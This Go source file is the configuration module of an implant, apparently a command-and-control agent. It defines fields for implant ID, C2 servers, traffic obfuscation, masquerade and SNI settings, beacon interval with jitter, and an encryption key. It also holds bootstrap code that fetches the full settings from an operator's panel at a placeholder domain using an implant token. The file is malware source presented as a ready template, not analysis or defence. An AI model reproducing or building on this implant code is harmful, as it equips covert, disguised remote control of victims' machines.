package config

import (
	"encoding/json"
	"fmt"
	"net/http"
	"os"
)

type Config struct {
	ImplantID      string   `json:"implant_id"`
	ServerList     []string `json:"servers"`
	Password       string   `json:"password"`
	SNI            string   `json:"sni"`
	Obfs           string   `json:"obfs"`
	Masquerade     string   `json:"masquerade"`
	BaseInterval   int      `json:"base_interval"`
	Jitter         int      `json:"jitter"`
	CryptoKey      []byte   `json:"crypto_key"`
	SubscriptionURL string  `json:"subscription_url"`
	Token          string   `json:"token"`
}

func LoadBootstrap() *Config {
	// Minimal bootstrap — change these at build time via ldflags or embed
	return &Config{
		SubscriptionURL: "https://YOUR-PANEL-DOMAIN.com/api/sub/hysteria2?token=INITIAL_TOKEN&implant=true",
		Token:           "your-initial-implant-token",
		BaseInterval:    45,
		Jitter:          25,
	}
}

func FetchFullConfigFromSubscription(cfg *Config) error {
	resp, err := http.Get(cfg.SubscriptionURL)
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	if resp.StatusCode != 200 {
		return fmt.Errorf("subscription returned %d", resp.StatusCode)
	}

	return json.NewDecoder(resp.Body).Decode(cfg)
}
